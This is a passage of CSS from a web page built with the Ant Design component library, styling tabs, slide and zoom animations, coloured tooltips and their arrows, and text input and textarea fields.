    .css-1ymq82w.ant-tabs .ant-tabs-tab-remove:focus:not(:focus-visible),
    .css-1ymq82w.ant-tabs .ant-tabs-tab-btn:active,
    .css-1ymq82w.ant-tabs .ant-tabs-tab-remove:active {
        color: #0958d9;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab-btn:focus-visible,
    .css-1ymq82w.ant-tabs .ant-tabs-tab-remove:focus-visible {
        outline: 4px solid #91caff;
        outline-offset: 1px;
        transition: outline-offset 0s, outline 0s;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab-btn {
        outline: none;
        transition: all 0.3s;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab-remove {
        flex: none;
        margin-right: -4px;
        margin-left: 8px;
        color: rgba(0, 0, 0, 0.45);
        font-size: 12px;
        background: transparent;
        border: none;
        outline: none;
        cursor: pointer;
        transition: all 0.3s;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab-remove:hover {
        color: rgba(0, 0, 0, 0.88);
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab:hover {
        color: #4096ff;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab.ant-tabs-tab-active .ant-tabs-tab-btn {
        font-size: 15px;
        color: #171A1D;
        text-shadow: 0 0 0.25px currentcolor;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab.ant-tabs-tab-disabled {
        color: rgba(0, 0, 0, 0.25);
        cursor: not-allowed;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab.ant-tabs-tab-disabled .ant-tabs-tab-btn:focus,
    .css-1ymq82w.ant-tabs .ant-tabs-tab.ant-tabs-tab-disabled .ant-tabs-remove:focus,
    .css-1ymq82w.ant-tabs .ant-tabs-tab.ant-tabs-tab-disabled .ant-tabs-tab-btn:active,
    .css-1ymq82w.ant-tabs .ant-tabs-tab.ant-tabs-tab-disabled .ant-tabs-remove:active {
        color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab .ant-tabs-tab-remove .anticon {
        margin: 0;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab .anticon {
        margin-right: 12px;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tab+.ant-tabs-tab {
        margin: 0 0 0 32px;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-content {
        position: relative;
        width: 100%;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-content-holder {
        flex: auto;
        min-width: 0;
        min-height: 0;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tabpane {
        outline: none;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-tabpane-hidden {
        display: none;
    }

    .css-1ymq82w.ant-tabs-centered>.ant-tabs-nav .ant-tabs-nav-wrap:not([class*='.ant-tabs-nav-wrap-ping']),
    .css-1ymq82w.ant-tabs-centered>div>.ant-tabs-nav .ant-tabs-nav-wrap:not([class*='.ant-tabs-nav-wrap-ping']) {
        justify-content: center;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-switch-appear,
    .css-1ymq82w.ant-tabs .ant-tabs-switch-enter {
        transition: none;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-switch-appear-start,
    .css-1ymq82w.ant-tabs .ant-tabs-switch-enter-start {
        opacity: 0;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-switch-appear-active,
    .css-1ymq82w.ant-tabs .ant-tabs-switch-enter-active {
        opacity: 1;
        transition: opacity 0.3s;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-switch-leave {
        position: absolute;
        transition: none;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-switch-leave-start {
        opacity: 1;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-switch-leave-active {
        opacity: 0;
        transition: opacity 0.3s;
    }

    .css-1ymq82w.ant-slide-up-enter,
    .css-1ymq82w.ant-slide-up-appear {
        animation-duration: 0.2s;
        animation-fill-mode: both;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-slide-up-leave {
        animation-duration: 0.2s;
        animation-fill-mode: both;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-slide-up-enter.ant-slide-up-enter-active,
    .css-1ymq82w.ant-slide-up-appear.ant-slide-up-appear-active {
        animation-name: css-1ymq82w-antSlideUpIn;
        animation-play-state: running;
    }

    .css-1ymq82w.ant-slide-up-leave.ant-slide-up-leave-active {
        animation-name: css-1ymq82w-antSlideUpOut;
        animation-play-state: running;
        pointer-events: none;
    }

    .css-1ymq82w.ant-slide-up-enter,
    .css-1ymq82w.ant-slide-up-appear {
        opacity: 0;
        animation-timing-function: cubic-bezier(0.23, 1, 0.32, 1);
    }

    .css-1ymq82w.ant-slide-up-leave {
        animation-timing-function: cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    .css-1ymq82w.ant-slide-down-enter,
    .css-1ymq82w.ant-slide-down-appear {
        animation-duration: 0.2s;
        animation-fill-mode: both;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-slide-down-leave {
        animation-duration: 0.2s;
        animation-fill-mode: both;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-slide-down-enter.ant-slide-down-enter-active,
    .css-1ymq82w.ant-slide-down-appear.ant-slide-down-appear-active {
        animation-name: css-1ymq82w-antSlideDownIn;
        animation-play-state: running;
    }

    .css-1ymq82w.ant-slide-down-leave.ant-slide-down-leave-active {
        animation-name: css-1ymq82w-antSlideDownOut;
        animation-play-state: running;
        pointer-events: none;
    }

    .css-1ymq82w.ant-slide-down-enter,
    .css-1ymq82w.ant-slide-down-appear {
        opacity: 0;
        animation-timing-function: cubic-bezier(0.23, 1, 0.32, 1);
    }

    .css-1ymq82w.ant-slide-down-leave {
        animation-timing-function: cubic-bezier(0.645, 0.045, 0.355, 1);
    }
</style>
<style>
    .css-1ymq82w[class^="ant-tooltip"],
    .css-1ymq82w[class*=" ant-tooltip"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-tooltip"]::before,
    .css-1ymq82w[class*=" ant-tooltip"]::before,
    .css-1ymq82w[class^="ant-tooltip"]::after,
    .css-1ymq82w[class*=" ant-tooltip"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-tooltip"] [class^="ant-tooltip"],
    .css-1ymq82w[class*=" ant-tooltip"] [class^="ant-tooltip"],
    .css-1ymq82w[class^="ant-tooltip"] [class*=" ant-tooltip"],
    .css-1ymq82w[class*=" ant-tooltip"] [class*=" ant-tooltip"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-tooltip"] [class^="ant-tooltip"]::before,
    .css-1ymq82w[class*=" ant-tooltip"] [class^="ant-tooltip"]::before,
    .css-1ymq82w[class^="ant-tooltip"] [class*=" ant-tooltip"]::before,
    .css-1ymq82w[class*=" ant-tooltip"] [class*=" ant-tooltip"]::before,
    .css-1ymq82w[class^="ant-tooltip"] [class^="ant-tooltip"]::after,
    .css-1ymq82w[class*=" ant-tooltip"] [class^="ant-tooltip"]::after,
    .css-1ymq82w[class^="ant-tooltip"] [class*=" ant-tooltip"]::after,
    .css-1ymq82w[class*=" ant-tooltip"] [class*=" ant-tooltip"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-tooltip {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: absolute;
        z-index: 1070;
        display: block;
        max-width: 250px;
        visibility: visible;
        --antd-arrow-background-color: rgba(0, 0, 0, 0.85);
    }

    .css-1ymq82w.ant-tooltip {
        width: max-content;
        width: intrinsic;
    }

    .css-1ymq82w.ant-tooltip-hidden {
        display: none;
    }

    .css-1ymq82w.ant-tooltip .ant-tooltip-inner {
        min-width: 32px;
        min-height: 32px;
        padding: 6px 8px;
        color: #fff;
        text-align: start;
        text-decoration: none;
        word-wrap: break-word;
        background-color: rgba(0, 0, 0, 0.85);
        border-radius: 6px;
        box-shadow: 0 6px 16px 0 rgba(0, 0, 0, 0.08), 0 3px 6px -4px rgba(0, 0, 0, 0.12), 0 9px 28px 8px rgba(0, 0, 0, 0.05);
    }

    .css-1ymq82w.ant-tooltip-placement-left .ant-tooltip-inner,
    .css-1ymq82w.ant-tooltip-placement-leftTop .ant-tooltip-inner,
    .css-1ymq82w.ant-tooltip-placement-leftBottom .ant-tooltip-inner,
    .css-1ymq82w.ant-tooltip-placement-right .ant-tooltip-inner,
    .css-1ymq82w.ant-tooltip-placement-rightTop .ant-tooltip-inner,
    .css-1ymq82w.ant-tooltip-placement-rightBottom .ant-tooltip-inner {
        border-radius: 6px;
    }

    .css-1ymq82w.ant-tooltip .ant-tooltip-content {
        position: relative;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-blue .ant-tooltip-inner {
        background-color: #1677ff;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-blue .ant-tooltip-arrow {
        --antd-arrow-background-color: #1677ff;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-purple .ant-tooltip-inner {
        background-color: #722ed1;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-purple .ant-tooltip-arrow {
        --antd-arrow-background-color: #722ed1;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-cyan .ant-tooltip-inner {
        background-color: #13c2c2;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-cyan .ant-tooltip-arrow {
        --antd-arrow-background-color: #13c2c2;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-green .ant-tooltip-inner {
        background-color: #52c41a;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-green .ant-tooltip-arrow {
        --antd-arrow-background-color: #52c41a;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-magenta .ant-tooltip-inner {
        background-color: #eb2f96;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-magenta .ant-tooltip-arrow {
        --antd-arrow-background-color: #eb2f96;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-pink .ant-tooltip-inner {
        background-color: #eb2f96;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-pink .ant-tooltip-arrow {
        --antd-arrow-background-color: #eb2f96;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-red .ant-tooltip-inner {
        background-color: #f5222d;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-red .ant-tooltip-arrow {
        --antd-arrow-background-color: #f5222d;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-orange .ant-tooltip-inner {
        background-color: #fa8c16;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-orange .ant-tooltip-arrow {
        --antd-arrow-background-color: #fa8c16;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-yellow .ant-tooltip-inner {
        background-color: #fadb14;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-yellow .ant-tooltip-arrow {
        --antd-arrow-background-color: #fadb14;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-volcano .ant-tooltip-inner {
        background-color: #fa541c;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-volcano .ant-tooltip-arrow {
        --antd-arrow-background-color: #fa541c;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-geekblue .ant-tooltip-inner {
        background-color: #2f54eb;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-geekblue .ant-tooltip-arrow {
        --antd-arrow-background-color: #2f54eb;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-lime .ant-tooltip-inner {
        background-color: #a0d911;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-lime .ant-tooltip-arrow {
        --antd-arrow-background-color: #a0d911;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-gold .ant-tooltip-inner {
        background-color: #faad14;
    }

    .css-1ymq82w.ant-tooltip.ant-tooltip-gold .ant-tooltip-arrow {
        --antd-arrow-background-color: #faad14;
    }

    .css-1ymq82w.ant-tooltip-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-tooltip .ant-tooltip-arrow {
        position: absolute;
        z-index: 1;
        display: block;
        border-radius: 0 0 2px;
        pointer-events: none;
        width: 32px;
        height: 32px;
        overflow: hidden;
    }

    .css-1ymq82w.ant-tooltip .ant-tooltip-arrow::after {
        content: "";
        position: absolute;
        width: 11.31370849898476px;
        height: 11.31370849898476px;
        bottom: 0;
        left: 0;
        right: 0;
        margin: auto;
        border-radius: 0 0 2px 0;
        transform: translateY(50%) rotate(-135deg);
        box-shadow: 3px 3px 7px rgba(0, 0, 0, 0.1);
        z-index: 0;
        background: transparent;
    }

    .css-1ymq82w.ant-tooltip .ant-tooltip-arrow::before {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 32px;
        height: 8px;
        background: var(--antd-arrow-background-color);
        clip-path: path('M 6.343145750507619 8 A 4 4 0 0 0 9.17157287525381 6.82842712474619 L 14.585786437626904 1.414213562373095 A 2 2 0 0 1 17.414213562373096 1.414213562373095 L 22.82842712474619 6.82842712474619 A 4 4 0 0 0 25.65685424949238 8 Z');
        content: "";
    }

    .css-1ymq82w.ant-tooltip .ant-tooltip-arrow:before {
        background: var(--antd-arrow-background-color);
    }

    .css-1ymq82w.ant-tooltip-placement-top .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-topLeft .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-topRight .ant-tooltip-arrow {
        bottom: 0;
        transform: translateY(100%) rotate(180deg);
    }

    .css-1ymq82w.ant-tooltip-placement-top .ant-tooltip-arrow {
        left: 50%;
        transform: translateX(-50%) translateY(100%) rotate(180deg);
    }

    .css-1ymq82w.ant-tooltip-placement-topLeft .ant-tooltip-arrow {
        left: 6px;
    }

    .css-1ymq82w.ant-tooltip-placement-topRight .ant-tooltip-arrow {
        right: 6px;
    }

    .css-1ymq82w.ant-tooltip-placement-bottom .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-bottomLeft .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-bottomRight .ant-tooltip-arrow {
        top: 0;
        transform: translateY(-100%);
    }

    .css-1ymq82w.ant-tooltip-placement-bottom .ant-tooltip-arrow {
        left: 50%;
        transform: translateX(-50%) translateY(-100%);
    }

    .css-1ymq82w.ant-tooltip-placement-bottomLeft .ant-tooltip-arrow {
        left: 6px;
    }

    .css-1ymq82w.ant-tooltip-placement-bottomRight .ant-tooltip-arrow {
        right: 6px;
    }

    .css-1ymq82w.ant-tooltip-placement-left .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-leftTop .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-leftBottom .ant-tooltip-arrow {
        right: 0;
        transform: translateX(100%) rotate(90deg);
    }

    .css-1ymq82w.ant-tooltip-placement-left .ant-tooltip-arrow {
        top: 50%;
        transform: translateY(-50%) translateX(100%) rotate(90deg);
    }

    .css-1ymq82w.ant-tooltip-placement-leftTop .ant-tooltip-arrow {
        top: 2px;
    }

    .css-1ymq82w.ant-tooltip-placement-leftBottom .ant-tooltip-arrow {
        bottom: 2px;
    }

    .css-1ymq82w.ant-tooltip-placement-right .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-rightTop .ant-tooltip-arrow,
    .css-1ymq82w.ant-tooltip-placement-rightBottom .ant-tooltip-arrow {
        left: 0;
        transform: translateX(-100%) rotate(-90deg);
    }

    .css-1ymq82w.ant-tooltip-placement-right .ant-tooltip-arrow {
        top: 50%;
        transform: translateY(-50%) translateX(-100%) rotate(-90deg);
    }

    .css-1ymq82w.ant-tooltip-placement-rightTop .ant-tooltip-arrow {
        top: 2px;
    }

    .css-1ymq82w.ant-tooltip-placement-rightBottom .ant-tooltip-arrow {
        bottom: 2px;
    }

    .css-1ymq82w.ant-tooltip-placement-topLeft,
    .css-1ymq82w.ant-tooltip-placement-top,
    .css-1ymq82w.ant-tooltip-placement-topRight {
        padding-bottom: 12px;
    }

    .css-1ymq82w.ant-tooltip-placement-bottomLeft,
    .css-1ymq82w.ant-tooltip-placement-bottom,
    .css-1ymq82w.ant-tooltip-placement-bottomRight {
        padding-top: 12px;
    }

    .css-1ymq82w.ant-tooltip-placement-leftTop,
    .css-1ymq82w.ant-tooltip-placement-left,
    .css-1ymq82w.ant-tooltip-placement-leftBottom {
        padding-right: 12px;
    }

    .css-1ymq82w.ant-tooltip-placement-rightTop,
    .css-1ymq82w.ant-tooltip-placement-right,
    .css-1ymq82w.ant-tooltip-placement-rightBottom {
        padding-left: 12px;
    }

    .css-1ymq82w.ant-tooltip-pure {
        position: relative;
        max-width: none;
    }

    .css-1ymq82w.ant-zoom-big-fast-enter,
    .css-1ymq82w.ant-zoom-big-fast-appear {
        animation-duration: 0.1s;
        animation-fill-mode: both;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-zoom-big-fast-leave {
        animation-duration: 0.1s;
        animation-fill-mode: both;
        animation-play-state: paused;
    }

    .css-1ymq82w.ant-zoom-big-fast-enter.ant-zoom-big-fast-enter-active,
    .css-1ymq82w.ant-zoom-big-fast-appear.ant-zoom-big-fast-appear-active {
        animation-name: css-1ymq82w-antZoomBigIn;
        animation-play-state: running;
    }

    .css-1ymq82w.ant-zoom-big-fast-leave.ant-zoom-big-fast-leave-active {
        animation-name: css-1ymq82w-antZoomBigOut;
        animation-play-state: running;
        pointer-events: none;
    }

    .css-1ymq82w.ant-zoom-big-fast-enter,
    .css-1ymq82w.ant-zoom-big-fast-appear {
        transform: scale(0);
        opacity: 0;
        animation-timing-function: cubic-bezier(0.08, 0.82, 0.17, 1);
    }

    .css-1ymq82w.ant-zoom-big-fast-enter-prepare,
    .css-1ymq82w.ant-zoom-big-fast-appear-prepare {
        transform: none;
    }

    .css-1ymq82w.ant-zoom-big-fast-leave {
        animation-timing-function: cubic-bezier(0.78, 0.14, 0.15, 0.86);
    }
</style>
<style>
    .css-1ymq82w[class^="ant-input"],
    .css-1ymq82w[class*=" ant-input"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-input"]::before,
    .css-1ymq82w[class*=" ant-input"]::before,
    .css-1ymq82w[class^="ant-input"]::after,
    .css-1ymq82w[class*=" ant-input"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-input"] [class^="ant-input"],
    .css-1ymq82w[class*=" ant-input"] [class^="ant-input"],
    .css-1ymq82w[class^="ant-input"] [class*=" ant-input"],
    .css-1ymq82w[class*=" ant-input"] [class*=" ant-input"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-input"] [class^="ant-input"]::before,
    .css-1ymq82w[class*=" ant-input"] [class^="ant-input"]::before,
    .css-1ymq82w[class^="ant-input"] [class*=" ant-input"]::before,
    .css-1ymq82w[class*=" ant-input"] [class*=" ant-input"]::before,
    .css-1ymq82w[class^="ant-input"] [class^="ant-input"]::after,
    .css-1ymq82w[class*=" ant-input"] [class^="ant-input"]::after,
    .css-1ymq82w[class^="ant-input"] [class*=" ant-input"]::after,
    .css-1ymq82w[class*=" ant-input"] [class*=" ant-input"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-input {
        box-sizing: border-box;
        margin: 0;
        padding: 4px 11px;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        position: relative;
        display: inline-block;
        width: 100%;
        min-width: 0;
        background-color: #ffffff;
        background-image: none;
        border-width: 1px;
        border-style: solid;
        border-color: #d9d9d9;
        border-radius: 6px;
        transition: all 0.2s;
    }

    .css-1ymq82w.ant-input::-moz-placeholder {
        opacity: 1;
    }

    .css-1ymq82w.ant-input::placeholder {
        color: rgba(0, 0, 0, 0.25);
        user-select: none;
    }

    .css-1ymq82w.ant-input:placeholder-shown {
        text-overflow: ellipsis;
    }

    .css-1ymq82w.ant-input:hover {
        border-color: #4096ff;
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input:focus,
    .css-1ymq82w.ant-input-focused {
        border-color: #4096ff;
        box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
        border-right-width: 1px;
        outline: 0;
    }

    .css-1ymq82w.ant-input-disabled,
    .css-1ymq82w.ant-input[disabled] {
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        border-color: #d9d9d9;
        box-shadow: none;
        cursor: not-allowed;
        opacity: 1;
    }

    .css-1ymq82w.ant-input-disabled:hover,
    .css-1ymq82w.ant-input[disabled]:hover {
        border-color: #d9d9d9;
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input-borderless,
    .css-1ymq82w.ant-input-borderless:hover,
    .css-1ymq82w.ant-input-borderless:focus,
    .css-1ymq82w.ant-input-borderless-focused,
    .css-1ymq82w.ant-input-borderless-disabled,
    .css-1ymq82w.ant-input-borderless[disabled] {
        background-color: transparent;
        border: none;
        box-shadow: none;
    }

    textarea.css-1ymq82w.ant-input {
        max-width: 100%;
        height: auto;
        min-height: 32px;
        line-height: 1.5714285714285714;
        vertical-align: bottom;
        transition: all 0.3s, height 0s;
        resize: vertical;
    }

    .css-1ymq82w.ant-input-lg {
        padding: 7px 11px;
        font-size: 16px;
        line-height: 1.5;
        border-radius: 8px;
    }

    .css-1ymq82w.ant-input-sm {
        padding: 0px 7px;
        border-radius: 4px;
    }

    .css-1ymq82w.ant-input-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-textarea-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-status-error:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input {
        border-color: #ff4d4f;
    }

    .css-1ymq82w.ant-input-status-error:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input:hover {
        border-color: #ffa39e;
    }

    .css-1ymq82w.ant-input-status-error:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input:focus,
    .css-1ymq82w.ant-input-status-error:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input-focused {
        border-color: #ff4d4f;
        box-shadow: 0 0 0 2px rgba(255, 38, 5, 0.06);
        border-right-width: 1px;
        outline: 0;
    }

    .css-1ymq82w.ant-input-status-error:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input .ant-input-prefix {
        color: #ff4d4f;
    }

    .css-1ymq82w.ant-input-status-warning:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input {
        border-color: #faad14;
    }

    .css-1ymq82w.ant-input-status-warning:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input:hover {
        border-color: #ffd666;
    }

    .css-1ymq82w.ant-input-status-warning:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input:focus,
    .css-1ymq82w.ant-input-status-warning:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input-focused {
        border-color: #faad14;
        box-shadow: 0 0 0 2px rgba(255, 215, 5, 0.1);
        border-right-width: 1px;
        outline: 0;
    }

    .css-1ymq82w.ant-input-status-warning:not(.css-1ymq82w.ant-input-disabled):not(.css-1ymq82w.ant-input-borderless).css-1ymq82w.ant-input .ant-input-prefix {
        color: #faad14;
    }

    .css-1ymq82w.ant-input[type="color"] {
        height: 32px;
    }

    .css-1ymq82w.ant-input[type="color"].ant-input-lg {
        height: 40px;
    }

    .css-1ymq82w.ant-input[type="color"].ant-input-sm {
        height: 24px;
        padding-top: 3px;
        padding-bottom: 3px;
    }

    .css-1ymq82w.ant-input-textarea {
        position: relative;
    }

    .css-1ymq82w.ant-input-textarea .ant-input-textarea-suffix {
        position: absolute;
        top: 0;
        right: 11px;
        bottom: 0;
        z-index: 1;
        display: inline-flex;
        align-items: center;
        margin: auto;
    }

    .css-1ymq82w.ant-input-textarea-status-error.ant-input-textarea-has-feedback .ant-input,
    .css-1ymq82w.ant-input-textarea-status-warning.ant-input-textarea-has-feedback .ant-input,
    .css-1ymq82w.ant-input-textarea-status-success.ant-input-textarea-has-feedback .ant-input,
    .css-1ymq82w.ant-input-textarea-status-validating.ant-input-textarea-has-feedback .ant-input {
        padding-right: 24px;
    }

    .css-1ymq82w.ant-input-textarea-show-count>.ant-input {
        height: 100%;
    }

    .css-1ymq82w.ant-input-textarea-show-count::after {
        color: rgba(0, 0, 0, 0.45);
        white-space: nowrap;
        content: attr(data-count);
        pointer-events: none;
        float: right;
    }

    .css-1ymq82w.ant-input-textarea-rtl::after {
        float: left;
    }

    .css-1ymq82w.ant-input-affix-wrapper {
        position: relative;
        display: inline-flex;
        width: 100%;
        min-width: 0;
        padding: 4px 11px;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        background-color: #ffffff;
        background-image: none;
        border-width: 1px;
        border-style: solid;
        border-color: #d9d9d9;
        border-radius: 6px;
        transition: all 0.2s;
    }

    .css-1ymq82w.ant-input-affix-wrapper::-moz-placeholder {
        opacity: 1;
    }

    .css-1ymq82w.ant-input-affix-wrapper::placeholder {
        color: rgba(0, 0, 0, 0.25);
        user-select: none;
    }

    .css-1ymq82w.ant-input-affix-wrapper:placeholder-shown {
        text-overflow: ellipsis;
    }

    .css-1ymq82w.ant-input-affix-wrapper:hover {
        border-color: #4096ff;
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input-affix-wrapper:focus,
    .css-1ymq82w.ant-input-affix-wrapper-focused {
        border-color: #4096ff;
        box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
        border-right-width: 1px;
        outline: 0;
    }

    .css-1ymq82w.ant-input-affix-wrapper-disabled,
    .css-1ymq82w.ant-input-affix-wrapper[disabled] {
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        border-color: #d9d9d9;
        box-shadow: none;
        cursor: not-allowed;
        opacity: 1;
    }

    .css-1ymq82w.ant-input-affix-wrapper-disabled:hover,
    .css-1ymq82w.ant-input-affix-wrapper[disabled]:hover {
        border-color: #d9d9d9;
        border-right-width: 1px;
    }

    .css-1ymq82w.ant-input-affix-wrapper-borderless,
    .css-1ymq82w.ant-input-affix-wrapper-borderless:hover,
    .css-1ymq82w.ant-input-affix-wrapper-borderless:focus,
    .css-1ymq82w.ant-input-affix-wrapper-borderless-focused,
    .css-1ymq82w.ant-input-affix-wrapper-borderless-disabled,
    .css-1ymq82w.ant-input-affix-wrapper-borderless[disabled] {
        background-color: transparent;
        border: none;
        box-shadow: none;
    }

    textarea.css-1ymq82w.ant-input-affix-wrapper {
        max-width: 100%;
        height: auto;
        min-height: 32px;
        line-height: 1.5714285714285714;
        vertical-align: bottom;
        transition: all 0.3s, height 0s;
        resize: vertical;
    }

    .css-1ymq82w.ant-input-affix-wrapper-lg {
        padding: 7px 11px;
        font-size: 16px;
        line-height: 1.5;
        border-radius: 8px;
    }

    .css-1ymq82w.ant-input-affix-wrapper-sm {
        padding: 0px 7px;
        border-radius: 4px;
    }

    .css-1ymq82w.ant-input-affix-wrapper-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-affix-wrapper-textarea-rtl {
        direction: rtl;
    }

    .css-1ymq82w.ant-input-affix-wrapper:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):hover {
        border-color: #4096ff;
        border-right-width: 1px;
        z-index: 1;
    }

    .ant-input-search-with-button .css-1ymq82w.ant-input-affix-wrapper:not(.css-1ymq82w.ant-input-affix-wrapper-disabled):hover {
        z-index: 0;
    }

    .css-1ymq82w.ant-input-affix-wrapper-focused,
    .css-1ymq82w.ant-input-affix-wrapper:focus {
        z-index: 1;
    }

    .css-1ymq82w.ant-input-affix-wrapper-disabled .ant-input[disabled] {
        background: transparent;
    }

    .css-1ymq82w.ant-input-affix-wrapper>input.ant-input {
        padding: 0;
        font-size: inherit;
        border: none;
        border-radius: 0;
        outline: none;
    }

    .css-1ymq82w.ant-input-affix-wrapper>input.ant-input:focus {
        box-shadow: none !important;
    }

    .css-1ymq82w.ant-input-affix-wrapper::before {
        width: 0;
        visibility: hidden;
        content: "\a0";
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-prefix,
    .css-1ymq82w.ant-input-affix-wrapper .ant-input-suffix {
        display: flex;
        flex: none;
        align-items: center;
    }

    .css-1ymq82w.ant-input-affix-wrapper .ant-input-prefix>*:not(:last-child),
    .css-1ymq82w.ant-input-affix-wrapper .ant-input-suffix>*:not(:last-child) {
        margin-right: 8px;
    }

